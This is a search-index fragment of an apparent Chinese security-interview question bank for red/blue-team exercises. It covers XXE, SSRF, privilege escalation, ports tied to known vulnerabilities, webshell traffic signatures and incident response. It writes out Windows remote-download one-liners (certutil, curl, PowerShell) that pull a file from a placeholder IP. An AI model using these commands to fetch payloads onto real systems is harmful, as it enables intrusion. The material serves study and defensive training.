\u4ee3\u7801\uff0c\u9020\u6210\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u3001\u547d\u4ee4\u6267\u884c\u3001\u5185\u7f51\u7aef\u53e3\u626b\u63cf\u3001\u653b\u51fb\u5185\u7f51\u7f51\u7ad9\u7b49\u5371\u5bb3</p> <p># XXE\u6f0f\u6d1e\u5c31\u662fxml\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\uff0c </p> <p>\u901a\u5e38\u548c\u5371\u5bb3\u4e00\u8d77\u56de\u7b54\u51fa\u6765\u4f1a\u611f\u89c9\u66f4\u52a0\u6d41\u7545\u548c\u81ea\u7136 </p> <p># \u901a\u5e38\u53d1\u751f\u5728\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790XML\u8f93\u5165\u65f6\uff0c\u6ca1\u6709\u7981\u6b62\u5916\u90e8\u5b9e\u4f53\u7684\u52a0\u8f7d\uff0c </p> <p>\u5bfc\u81f4\u53ef\u52a0\u8f7d\u6076\u610f\u5916\u90e8\u6587\u4ef6\uff0c </p> <p>\u9020\u6210\u6587\u4ef6\u8bfb\u53d6\u3001 </p> <p>\u547d\u4ee4\u6267\u884c\u3001 </p> <p>\u5185\u7f51\u7aef\u53e3\u626b\u63cf\u3001 </p> <p>\u653b\u51fb\u5185\u7f51\u7f51\u7ad9\u3001 </p> <p>\u53d1\u8d77dos\u653b\u51fb\u7b49\u5371\u5bb3\u3002 </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_16","title":"\u5e94\u6025\u54cd\u5e94\u6d41\u7a0b","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#wiresharky","title":"Wireshark\uff08Y\u513f\u6740\u514b\uff09\u8fdb\u884c\u6d41\u91cf\u5206\u6790","text":"<p>wireshark \u7b80\u5355\u7684\u8fc7\u6ee4\u89c4\u5219 </p> <p>\u8fc7\u6ee4 ip: </p> <p>\u8fc7\u6ee4\u6e90 ip \u5730\u5740: </p> <p>ip.src==1.1.1.1; </p> <p>, \u2f6c\u7684 ip \u5730\u5740: </p> <p>ip.dst==1.1.1.1; </p> <p>\u8fc7\u6ee4\u7aef\u2f1d: </p> <p>\u8fc7\u6ee4 80 \u7aef\u2f1d: </p> <p>tcp.port==80 </p> <p>, \u6e90\u7aef\u2f1d: </p> <p>tcp.srcport==80 </p> <p>, \u2f6c\u7684\u7aef\u2f1d: </p> <p>tcp.dstport==80 </p> <p>\u534f\u8bae\u8fc7\u6ee4: </p> <p>\u76f4\u63a5\u8f93\u2f0a\u534f\u8bae\u540d\u5373\u53ef, \u5982 http \u534f\u8bae </p> <p>http </p> <p>http \u6a21\u5f0f\u8fc7\u6ee4: </p> <p>\u8fc7\u6ee4 get/post \u5305 </p> <p>Windows\u7cfb\u7edf\u65e5\u5fd7\uff1aWindows\u7cfb\u7edf\u81ea\u5e26\u7684\u5ba1\u8ba1\u65e5\u5fd7\u3001\u64cd\u4f5c\u65e5\u5fd7\u3001\u6545\u969c\u65e5\u5fd7\u3002</p> <p>Linux\u7cfb\u7edf\u65e5\u5fd7\uff1aLinux\u7cfb\u7edf\u81ea\u5e26\u7684\u5ba1\u8ba1\u65e5\u5fd7\u3001\u64cd\u4f5c\u65e5\u5fd7\u3001\u6545\u969c\u65e5\u5fd7\u3002</p> <p>\u5e94\u7528\u65e5\u5fd7\uff1a\u5305\u62ec\u4f46\u4e0d\u9650\u4e8eWeb\u5e94\u7528\u7b49\u4f17\u591a\u7e41\u6742\u7684\u65e5\u5fd7\u3002</p> <p>Linux\u65e5\u5fd7\uff1a\u201c/var/log</p> <p>WIN</p> 4624 \u767b\u5f55\u6210\u529f 4625 \u767b\u5f55\u5931\u8d25 4634 \u8d26\u53f7\u88ab\u6ce8\u9500 <p></p><p>5672</p><p>4720</p> <p>\u7ba1\u7406\u5458\u7528\u6237\u767b\u5f55</p><p>\u521b\u5efa\u7528\u6237</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#4625","title":"4625\u767b\u9646\u4e8b\u4ef6","text":"<p>\u5fae\u6b65\u5728\u7ebf</p> <p>\u7f51\u7edc\uff08\u975e\u6cd5\u94fe\u63a5\uff09 \u662f\u5426\u4ecd\u7136\u5b58\u5728\u6570\u636e\u5916\u4f20\u3001\u975e\u6cd5\u5916\u8054\u7b49\u884c\u4e3a\u3002 \u8fdb\u7a0b\uff08\u670d\u52a1\u3001\u7aef\u53e3\uff09 \u662f\u5426\u4ecd\u7136\u5b58\u5728\u4f2a\u9020\u7684\u6728\u9a6c\u8fdb\u7a0b\u3002 \u81ea\u542f\u52a8\u9879\u76ee \u5904\u7406\u5b8c\u6210\u540e\u662f\u5426\u4ecd\u4f1a\u5f00\u673a\u81ea\u542f\u3002 \u6587\u4ef6 \u662f\u5426\u4ecd\u7136\u5b58\u5728\u6b8b\u7559\u540e\u95e8\u6216\u6076\u610f\u6587\u4ef6\u3002 \u65e5\u5fd7 \u65e5\u5fd7\u4e2d\u662f\u5426\u8bb0\u5f55\u4e86\u9ed1\u5ba2\u7684\u653b\u51fb\u8def\u5f84\u548c\u5229\u7528\u65b9\u5f0f\u3002 \u9a71\u52a8 \u5e95\u5c42\u662f\u5426\u5b58\u5728\u53ef\u88ab\u5229\u7528\u7684\u6f0f\u6d1e\u9a71\u52a8\u7248\u672c\u3002 \u8f6f\u4ef6\u7248\u672c \u90e8\u5206\u8f6f\u4ef6\u7248\u672c\u5b58\u5728\u660e\u663e\u5b89\u5168\u6f0f\u6d1e\u6216\u8005\u914d\u7f6e\u95ee\u9898\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#37","title":"37\u3001\u6709\u54ea\u4e9b\u53cd\u5411\u4ee3\u7406\u7684\u2f2f\u5177?","text":"<p>reGeirg\u3001EW\u3001lcx\u3001Ngrok\u3001frp</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#3","title":"3\u3001\u6f0f\u6d1e\u5229\u2f64 &amp; \u6743\u9650\u63d0\u5347","text":"<p>a\u3001 mysql \u63d0\u6743 serv u \u63d0\u6743 oracle \u63d0\u6743</p> <p>b\u3001windows \u6ea2\u51fa\u63d0\u6743</p> <p>c\u3001linux \u810f\u2f5c, \u5185\u6838\u6f0f\u6d1e\u63d0\u6743 e</p> <p>\u63d0\u6743\u670d\u52a1\u5668\uff0c\u2f50\u5982 windows \u4e0b mysql \u7684 udf \u63d0\u6743\uff0cserv-u \u63d0\u6743\uff0cwindows \u4f4e\u7248\u672c\u7684\u6f0f\u6d1e\uff0c\u5982 iis6,pr, \u5df4\u2ec4\u70e4\u2f81\uff0clinux</p> <p>\u810f\u2f5c\u6f0f\u6d1e\uff0clinux \u5185\u6838\u7248\u672c\u6f0f\u6d1e\u63d0\u6743\uff0clinux \u4e0b\u7684 mysql system \u63d0\u6743\u4ee5\u53ca oracle \u4f4e\u6743\u9650\u63d0\u6743</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_17","title":"\u5c0f\u7a0b\u5e8f\u7684\u6e17\u900f\u548c\u666e\u901a\u6e17\u900f\u7684\u5dee\u5f02","text":"<p>\u6e17\u900f\u8fc7\u7a0b\u4e0d\u53d8\uff0c\u4f9d\u65e7\u662f\u6293\u5305\u4fee\u6539\u53c2\u6570\u6e17\u900f \u4e0d\u540c\u70b9\u662f\u5c0f\u7a0b\u5e8f\u4f1a\u5c06\u5305\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u53ef\u4ee5\u4f7f\u7528\u9006\u5411\u8fd8\u539f\u5de5\u5177\u53cd\u7f16\u8bd1</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#spring","title":"Spring\uff08\u6b7b\u6da6\uff09","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#php","title":"php \u4e2d\u547d\u4ee4\u6267\u2f8f\u6d89\u53ca\u5230\u7684\u51fd\u6570","text":"<p>\u4ee3\u7801\u6267\u2f8f\uff1aeval()\u3001assert()\u3001popen()\u3001system()\u3001exec()\u3001shell_exec()\u3001 </p> <p>passthru(),pcntl_exec(),call_user_func_array(),create_function()\u2f42\u4ef6\u8bfb\u53d6\uff1afifile_get_contents(),highlight_fifile(),fopen(),read fifile(),fread(),fgetss(), </p> <p>fgets(),parse_ini_fifile(),show_source(),fifile() \u7b49 </p> <p>\u547d\u4ee4\u6267\u2f8f\uff1asystem(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#66-","title":"66-\u6587\u4ef6\u5305\u542b\u90fd\u6709\u54ea\u4e9b\u4f2a\u534f\u8bae\uff1f","text":"<p>file:// \u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf </p> <p>http:// \u8bbf\u95ee HTTPs \u7f51\u5740 </p> <p>ftp:// \u8bbf\u95ee ftp URL </p> <p>Php:// \u8bbf\u95ee\u8f93\u5165\u8f93\u51fa\u6d41 </p> <p>Zlib:// \u538b\u7f29\u6d41 </p> <p>Data:// \u6570\u636e </p> <p>Ssh2:// security shell2 </p> <p>Expect:// \u5904\u7406\u4ea4\u4e92\u5f0f\u7684\u6d41 </p> <p>Glob:// \u67e5\u627e\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84 </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#41-","title":"41-\u4e86\u89e3\u90a3\u4e9b\u7aef\u53e3\uff1f","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#web","title":"web\u7f51\u7ad9","text":"<p>80 web </p> <p>80-89 web </p> <p>8000-9090 web </p> <p>8080 Tomcat Web </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_18","title":"\u6570\u636e\u5e93","text":"<p>1433 MSSQL </p> <p>1521 Oracle </p> <p>3306 MySQL </p> <p>5432 PostgreSQL </p> <p>50000 DB2 </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_19","title":"\u7279\u6b8a\u670d\u52a1\u7c7b","text":"<p>443 SSL\u5fc3\u810f\u6ef4\u8840 </p> <p>445 ms08067/ms11058/ms17010\u7b49 </p> <p>873 Rsync\u672a\u6388\u6743 </p> <p>2049 \u901a\u8fc7\u7f51\u7edc\uff0c\u8de8\u5e73\u53f0\u5b9e\u73b0\u6587\u4ef6\u5171\u4eab </p> <p>4000 \u817e\u8bafQQ\u5ba2\u6237\u7aef </p> <p>5984 CouchDB http://xxx:5984/_utils/ </p> <p>6379 redis\u672a\u6388\u6743 </p> <p>7001,7002 WebLogic\u9ed8\u8ba4\u5f31\u53e3\u4ee4\uff0c\u53cd\u5e8f\u5217 </p> <p>9200,9300 elasticsearch \u53c2\u8003WooYun: \u591a\u73a9\u67d0\u670d\u52a1\u5668ElasticSearch\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e </p> <p>11211 memcache\u672a\u6388\u6743\u8bbf\u95ee </p> <p>27017,27018 Mongodb\u672a\u6388\u6743\u8bbf\u95ee </p> <p>50000 SAP\u547d\u4ee4\u6267\u884c </p> <p>50070,50030 hadoop\u9ed8\u8ba4\u7aef\u53e3\u672a\u6388\u6743\u8bbf\u95ee </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_20","title":"\u5e38\u7528\u7aef\u53e3\u7c7b","text":"<p>20 ftp : FTP\u670d\u52a1\u5668\u771f\u6b63\u4f20\u8f93\u6240\u7528\u7684\u7aef\u53e3\uff0c\u7528\u4e8e\u4e0a\u4f20\u3001\u4e0b\u8f7d </p> <p>21 ftp : \u7528\u4e8eFTP\u7684\u767b\u9646\u8ba4\u8bc1 </p> <p>22 SSH\u3001SFTP \uff1a \u52a0\u5bc6\u7684\u8fdc\u7a0b\u767b\u5f55\uff1b\u6587\u4ef6\u4f20\u8f93 </p> <p>23 Telnet\uff1a \u8fdc\u7a0b\u767b\u5f55(\u5728\u672c\u5730\u4e3b\u673a\u4e0a\u4f7f\u7528\u6b64\u7aef\u53e3\u4e0e\u8fdc\u7a0b\u670d\u52a1\u5668\u768422/3389\u7aef\u53e3\u8fde\u63a5\uff09 </p> <p>25 SMTP: \u7528\u4e8e\u53d1\u9001\u90ae\u4ef6 </p> <p>P3\uff1a SUN\u516c\u53f8\u7684RPC\u670d\u52a1\u6240\u6709\u7aef\u53e3 </p> <p>445 SMB \u5f31\u53e3\u4ee4\u626b\u63cf </p> <p>2601,2604 zebra \u8def\u7531\uff0c\u9ed8\u8ba4\u5bc6\u7801zebra </p> <p>3389 \u8fdc\u7a0b\u684c\u9762 </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#2nmap","title":"2\u3001\u95ee\uff1a\u5e38\u7528\u7684nmap\u547d\u4ee4\u662f\u4ec0\u4e48\u5462\uff1f","text":"<p>\u7b54\uff1a-O\uff0c\u63a2\u6d4b\u64cd\u4f5c\u7cfb\u7edf\u4fe1\u606f\uff1b-A\uff0c\u626b\u63cf\u64cd\u4f5c\u7cfb\u7edf\u548c\u670d\u52a1\u5668\u7248\u672c\uff0c\u8ddf\u8e2a\u8def\u7531\uff1b-T\uff0c\u8bbe\u7f6e\u626b </p> <p>\u63cf\u5f3a\u5ea6\uff1b-Pn\uff0c\u4e0dping\u626b\u63cf\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_21","title":"\u54ea\u4e9b\u6f0f\u6d1e\u88ab\u9ad8\u9891\u6253\u70b9.","text":"<p>\\1. Apache Shiro \u76f8\u5173\u6f0f\u6d1e </p> <p>\\2. Fastjson \u6f0f\u6d1e</p> <p>\\3. Log4j </p> <p>\\4. \u4e0a\u4f20\u6f0f\u6d1e </p> <p>\\5. \u8fb9\u754c\u7f51\u7edc\u8bbe\u5907\u8d44\u4ea7 + \u5f31\u53e3\u4ee4</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_22","title":"\u5728\u5916\u7f51\u6253\u70b9\u8fc7\u7a0b\u4e2d\uff0c \u5e38\u7528\u7684\u4fe1\u606f\u6536\u96c6\u5de5 \u5177\u6709\u54ea\u4e9b\uff1f","text":"<p>ENScan \u4f01\u4e1a\u4fe1\u606f\u67e5\u8be2\u5de5\u5177 </p> <p>Oneforall \u5b50\u57df\u540d\u6536\u96c6\u5de5\u5177 </p> <p>\u6c34\u6cfd \u4fe1\u606f\u6536\u96c6\u81ea\u52a8\u5316\u5de5\u5177 </p> <p>FOFA\u3001Goby \u7f51\u7edc\u7a7a\u95f4\u8d44\u4ea7\u68c0\u7d22\\\u653b\u51fb\u9762\u6d4b\u7ed8\u5de5\u5177 </p> <p>Masscan \u7aef\u53e3\u626b\u63cf\u5de5\u5177 </p> <p>ARL \u8d44\u4ea7\u5b89\u5168\u706f\u5854 \u5feb\u901f\u4fa6\u5bdf\u4e0e\u76ee\u6807\u5173\u8054\u7684\u8d44\u4ea7\u5de5\u5177</p> <p>\u5e38\u89c1\u7684\u6570\u636e\u5e93\u5bf9\u5e94\u7684\u7aef\u53e3</p> <p>Mysql 3306</p> <p>Oracle 1521</p> <p>Sql sver 1433</p> <p>DB2 5000</p> <p>Postgresql 5432</p> <p>DM 5236</p> <p>Redis 6379</p> <p>\u5e38\u89c1\u7f51\u9875\u72b6\u6001\u7801</p> <p>403 \u8d44\u6e90\u4e0d\u5b58\u5728</p> <ol> <li>\u65e0\u54cd\u5e94</li> </ol> <p>500 \u670d\u52a1\u5668\u5185\u90e8\u9519\u8bef</p> <p>windows\u8fdc\u7a0b\u4e0b\u8f7d</p> <p>certutil -urlcache -split -f http://xx.xx.xx.xx/test.zip c: est.zip  \uff08windows\u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\u81f3\u672c\u5730\uff0c\u4ec5\u9700\u8981\u4e00\u4e2acmd\u6267\u884c\u7684\u5730\u65b9\uff09</p> <p>curl http://xx.xx.xx.xx/test.zip -o c:  est.zip</p> <p>powershell -c \"invoke-webrequest -uri http://xx.xx.xx.xx/test.zip -outfile test.zip\"</p> <p>\u54e5\u65af\u62c9\u6d41\u91cf\u7279\u5f81</p> <p>User-Agent\u4f1a\u7c7b\u4f3c\u4e8ejava/1.8.0_121</p> <p>cookie\u5f53\u4e2d\u4f1a\u6709\u5206\u53f7</p> <p>\u8bf7\u6c42\u4f53\uff1a\u5bf9\u539f\u59cb\u6570\u636e\u8fdb\u884cbase64\u7f16\u7801\u4ee5\u53ca\u539f\u59cb\u7684\u52a0\u5bc6raw\u4e24\u79cd\u5f62\u5f0f\u901a\u8baf\u6570\u636e</p> <p>\u54cd\u5e94\u4f53\uff1a\u5982\u679c\u8bf7\u6c42\u4f53\u662fbase64\u52a0\u5bc6\u7684\u54cd\u5e94\u7684\u4e5f\u662fbase64\u52a0\u5bc6\uff0c\u54cd\u5e94\u4f53\u4f1a\u51fa\u73b0\u4e00\u4e2a\u975e\u5e38\u660e\u663e\u7684\u56fa\u5b9a\u7279\u5f81\u3002</p> <p>\u83dc\u5200\u7684\u7279\u5f81</p> <p>Ua\u5934\u4e3a\u767e\u5ea6\u722c\u866b</p> <p>\u8bf7\u6c42\u4f53\u4e2d\u4f1a\u5b58\u5728eval\u3001base64\u7b49\u7279\u5f81\u5b57\u7b26</p> <p>\u8bf7\u6c42\u4f53\u8fdb\u884cbase64\u52a0\u5bc6</p> <p>\u51b0\u874e3.0\u6d41\u91cf\u7279\u5f81</p> <p>User-agent</p> <p>\u51b0\u874e3.0\u6bcf\u6b21\u8bf7\u6c42\u90fd\u4f1a\u968f\u673a\u751f\u6210\u4e00\u4e2auser-agent\uff0c\u5982\u679c\u4e0d\u505a\u8bbe\u7f6e\uff0c\u51b0\u874e\u5f53\u4e2d\u5b58\u572816\u4e2auser-agent\uff0c\u4f1a\u968f\u673a\u9009\u62e9\u4e00\u4e2a\uff0c\u4f46\u90fd\u662f\u6bd4\u8f83\u8001\u7684</p> <p>Accept&amp;Cache-Control</p> <p>\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u8fd9\u4e2a\uff0c\u4f1a\u663e\u793a\u5982\u4e0b\uff0c\u6b63\u5e38\u8bbf\u95eeaccept\u5934\u4e0d\u4f1a\u5982\u6b64\u7b80\u5355</p> <p>Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</p> <p>Cache-Control: no-cache</p> <p>Pragma: no-cache</p> <p>User-Agent: java/1.8</p> <p>content-length \u8bf7\u6c42\u957f\u5ea6</p> <p>\u4efb\u4f55\u8bf7\u6c42\uff0c\u6700\u7ec8\u90fd\u4f1a\u8c03\u7528Utils.getData\u51fd\u6570\uff0c\u5bf9\u8bf7\u6c42\u7684\u53c2\u6570\u52a0\u5bc6\u3002\u5bf9\u4e8e\u4e0a\u4f20\u6587\u4ef6\uff0c\u547d\u4ee4\u6267\u884c\u6765\u8bb2\uff0c\u52a0\u5bc6\u7684\u53c2\u6570\u4e0d\u5b9a\u957f\u3002\u4f46\u662f\u5bf9\u4e8e\u5bc6\u94a5\u4ea4\u4e92\uff0c\u83b7\u53d6\u57fa\u672c\u4fe1\u606f\u6765\u8bb2\uff0cpayload\u90fd\u4e3a\u5b9a\u957f\uff0c\u4e14\u65e0\u968f\u673apadding</p> <p>\u65e5\u5fd7\u4e3b\u8981\u770b\u90a3\u4e9b</p> <p>Win</p> <p>\u7cfb\u7edf\u65e5\u5fd7</p> <p>\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7</p> <p>\u5b89\u5168\u65e5\u5fd7</p> <p>Linux</p> <p>\u767b\u9646\u65e5\u5fd7</p> <p>\u5b89\u5168\u65e5\u5fd7</p> <p>Web\u65e5\u5fd7</p> <p>\u6eaf\u6e90</p> <p>IP\u6eaf\u6e90</p> <p>\u8eab\u4efdID\u6eaf\u6e90</p> <p>\u767b\u5f55\u9875\u9762\u5982\u4f55\u505a\u52a0\u56fa</p> <p>\u8bbe\u7f6etoken</p> <p>\u8bbe\u7f6e\u9a8c\u8bc1</p> <p>\u6302\u9759\u6001\u9875\u9762</p> <p>\u767b\u9646\u9519\u8bef\u9650\u5236\u6b21\u6570</p> <p>refer\u9a8c\u8bc1</p> <p>\u5e94\u6025\u54cd\u5e94\u601d\u8def</p> <p>\u54cd\u5e94</p> <p>\u5224\u65ad\u4e8b\u4ef6\u7c7b\u578b</p> <p>\u4fe1\u606f\u6536\u96c6</p> <p>\u963b\u65ad</p> <p>\u5c01\u5835</p> <p>\u5173\u95ed\u7f51\u7edc</p> <p>\u4e0b\u7ebf</p> <p>\u5206\u6790</p> <p>\u65e5\u5fd7</p> <p>\u6d41\u91cf</p> <p>\u653b\u51fb\u6837\u672c</p> <p>\u6e05\u9664</p> <p>\u52a0\u56fa</p> <p>\u767b\u5f55\u9875\u9762\u7684\u6e17\u900f\u601d\u8def</p> <p>\u7206\u7834</p> <p>\u4e07\u80fd\u5bc6\u7801\u7ed5\u8fc7</p> <p>\u767b\u9646\u53e3sql\u6ce8\u5165</p> <p>\u7528\u6237\u679a\u4e3e</p> <p>\u903b\u8f91\u6f0f\u6d1e</p> <p>\u4efb\u610f\u5bc6\u7801\u91cd\u7f6e</p> <p>\u4efb\u610f\u7528\u6237\u6ce8\u518c</p> <p>\u77ed\u4fe1\u8f70\u70b8</p> <p>\u4e0d\u5b89\u5168\u767b\u9646</p> <p>\u9a8c\u8bc1\u7801\u53ef\u4fee\u6539\u63a5\u53d7\u8005</p> <p>\u767b\u5f55\u9a8c\u8bc1\u7801\u53ef\u7ed5\u8fc7</p> <p>\u9a8c\u8bc1\u7801\u56de\u663e\u524d\u7aef</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#hw_1","title":"HW\u95ee\u9898","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_23","title":"\u62a4\u7f51\u62c5\u4efb\u89d2\u8272","text":"<p>\u76d1\u63a7 \u7814\u5224 \u5904\u7f6e</p> <p>\u5e94\u6025</p> <p>\u6eaf\u6e90</p> <p>\u5e26\u961f</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_24","title":"\u63a5\u89e6\u8fc7\u54ea\u4e9b\u5b89\u5168\u8bbe\u5907","text":"<p>Waf</p> <p>ips \u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08IPS\u4e00\u822c\u4e5f\u662f\u5728\u7f51\u7edc\u5c42\u65c1\u8def\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u5177\u5907\u963b\u65ad\u80fd\u529b\u7684IDS\uff0c\u662fIDS\u7684\u5347\u7ea7\u7248\uff08\u4e5f\u6709IDS\u68c0\u6d4b\u5230\u653b\u51fb\u901a\u77e5\u963b\u65ad\u8bbe\u5907\u6267\u884c\u963b\u65ad\u52a8\u4f5c\u7684\u8bbe\u5907\u8054\u52a8\u6a21\u5f0f\uff09\uff0c\u53ef\u4ee5\u8986\u76d6\u7f51\u7edc\u5c42\u548c\u5e94\u7528\u5c42\uff09</p> <p>ids \u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08IDS\u5de5\u4f5c\u5728\u7f51\u7edc\u5c42\uff0c\u65c1\u8def\u90e8\u7f72\uff0c\u901a\u8fc7\u6293\u53d6\u548c\u5206\u6790\u7f51\u7edc\u6d41\u91cf\u6765\u53d1\u73b0\u653b\u51fb\uff09</p> <p>\uff08\u5947\u5b89\u4fe1\u5929\u773c\uff09</p> <p>hids \u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08\u9752\u85e4\u4e91\u8bbe\u5907 \u5947\u5b89\u4fe1\u6912\u56fe\uff09</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_25","title":"\u8bbe\u5907\u539f\u7406","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_26","title":"\u524d\u671f\u51c6\u5907\u5de5\u4f5c","text":"<p>\u57fa\u7ebf\u68c0\u67e5\u3001\u7ea2\u961f\u6f14\u4e60\u3001\u5b89\u5168\u52a0\u56fa</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_27","title":"\u5e94\u6025\u5f97\u5206\u6848\u4f8b","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_28","title":"\u6eaf\u6e90\u5f97\u5206\u6848\u4f8b","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_29","title":"\u7814\u5224\u5206\u6790","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#web_1","title":"web\u57fa\u7840","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#web-top10_1","title":"Web Top10","text":"<p>1. SQL\u6ce8\u5165 </p> <p>2. \u5931\u6548\u7684\u8eab\u4efd\u8ba4\u8bc1 </p> <p>3. \u654f\u611f\u6570\u636e\u6cc4\u9732 </p> <p>4. XML\u5916\u90e8\u5b9e\u4f53\uff08XXE\uff09 </p> <p>5. \u5931\u6548\u7684\u8bbf\u95ee\u63a7\u5236 </p> <p>6. \u5b89\u5168\u914d\u7f6e\u9519\u8bef </p> <p>7. \u8de8\u7ad9\u811a\u672c\uff08XSS\uff09 </p> <p>8. \u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316 </p> <p>9. \u4f7f\u7528\u542b\u6709\u5df2\u77e5\u6f0f\u6d1e\u7684\u7ec4\u4ef6 </p> <p>10. \u4e0d\u8db3\u7684\u65e5\u5fd7\u8bb0\u5f55\u548c\u76d1\u63a7</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#ssrf-csrf","title":"SSRF CSRF\u533a\u522b","text":"<p>\u5ba2\u6237\u7aef/\u670d\u52a1\u7aef/\u8bf7\u6c42\u4f2a\u9020</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#ssrf_2","title":"SSRF\u539f\u7406/\u5229\u7528/\u9632\u5fa1/\u7ed5\u8fc7/\u6316\u6398","text":"<p>\u670d\u52a1\u5668\u8bf7\u6c42\u4f2a\u9020\uff0c\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\uff0c\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u505a\u8fc7\u6ee4\u4e0e\u9650\u5236\uff0c\u670d\u52a1\u5668\u5c31\u4ee5\u670d\u52a1\u5668\u81ea\u5df1\u7684\u8eab\u4efd\u53bb\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u5668\u7684\u8d44\u6e90\u3002</p> <p>SSRF \u9632\u5fa1</p> <ol> <li>\u8bbe\u7f6eURL\u767d\u540d\u5355\u6216\u8005\u9650\u5236\u5185\u7f51IP</li> <li>\u7edf\u4e00\u9519\u8bef\u4fe1\u606f\uff0c\u907f\u514d\u7528\u6237\u53ef\u4ee5\u6839\u636e\u9519\u8bef\u4fe1\u606f\u6765\u5224\u65ad\u8fdc\u7a0b\u670d\u52a1\u5668\u7aef\u53e3\u72b6\u6001</li> <li>\u9650\u5236\u8bf7\u6c42\u7684\u7aef\u53e3\u4e3aHTTP\u5e38\u7528\u7684\u7aef\u53e3\uff0c\u6bd4\u5982 80,443,8080,8088\u7b49</li> <li>\u7981\u7528\u4e0d\u9700\u8981\u7684\u534f\u8bae\uff0c\u4ec5\u4ec5\u5141\u8bb8HTTP\u548cHTTPS</li> </ol> <p>SSRF\u5229\u7528</p> <p>1.dict\u534f\u8bae\uff0c\u6cc4\u9732\u5b89\u88c5\u8f6f\u4ef6\u7248\u672c\u4fe1\u606f\uff0c\u67e5\u770b\u7aef\u53e3\uff0c\u64cd\u4f5c\u5185\u7f51redis\u670d\u52a1\u7b49 2.file\u534f\u8bae\uff0c\u5728\u6709\u56de\u663e\u7684\u60c5\u51b5\u4e0b\uff0c\u5229\u7528 file \u534f\u8bae\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u5185\u5bb9</p> <p>3.gopher\uff1agopher\u652f\u6301\u53d1\u51faGET\u3001POST\u8bf7\u6c42\uff1a\u53ef\u4ee5\u5148\u622a\u83b7get\u8bf7\u6c42\u5305\u548cpost\u8bf7\u6c42\u5305\uff0c\u518d\u6784\u9020\u6210\u7b26\u5408gopher\u534f\u8bae\u7684\u8bf7\u6c42\u3002gopher\u534f\u8bae\u662fssrf\u5229\u7528\u4e2d\u4e00\u4e2a\u6700\u5f3a\u5927\u7684\u534f\u8bae(\u4fd7\u79f0\u4e07\u80fd\u534f\u8bae)\u3002\u53ef\u7528\u4e8e\u53cd\u5f39shell</p> <p>4.http/s\u534f\u8bae\uff0c\u63a2\u6d4b\u5185\u7f51\u4e3b\u673a\u5b58\u6d3b</p> <p>SSRF\u6316\u6398</p> <p>1.\u5206\u4eab\uff1a\u901a\u8fc7URL\u5730\u5740\u5206\u4eab\u7f51\u9875\u5185\u5bb9</p> <p>2.\u8f6c\u7801\u670d\u52a1</p> <p>3.\u5728\u7ebf\u7ffb\u8bd1</p> 